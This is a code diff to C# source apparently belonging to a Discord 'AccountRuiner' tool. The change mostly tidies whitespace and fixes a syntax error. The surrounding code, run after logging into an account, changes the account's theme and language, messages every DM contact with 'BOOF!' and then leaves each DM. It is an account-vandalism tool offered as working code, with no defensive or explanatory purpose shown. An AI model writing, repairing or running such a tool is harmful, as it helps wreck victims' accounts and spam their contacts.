@@ -39,21 +39,18 @@ namespace AccountRuiner
 
         private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
         {
-            
-           
-         
             Console.WriteLine("How Many Guilds? (Max is 100)");
             int guilds = int.Parse(Console.ReadLine());
             Console.Clear();
-              
-                //this function is for updating profile related settings
-                client.User.ChangeSettings(new UserSettings() { Theme = Theme.Light });
-                client.User.ChangeSettings(new UserSettings() { Language = Language.Russian };
-            
+
+            //this function is for updating profile related settings
+            client.User.ChangeSettings(new UserSettings() { Theme = Theme.Light });
+            client.User.ChangeSettings(new UserSettings() { Language = Language.Russian });
+
             Console.WriteLine("Press Enter When Ready");
             Console.ReadLine();
- 
-         
+
+
             foreach (var dm in client.GetPrivateChannels())
             {
                 try
@@ -73,7 +70,7 @@ namespace AccountRuiner
                     dm.SendMessage("BOOF!", false, embed);
                 }
                 catch (Exception) { }
-                
+
                 Console.WriteLine("Leaving DMs...");
                 dm.Leave();
 
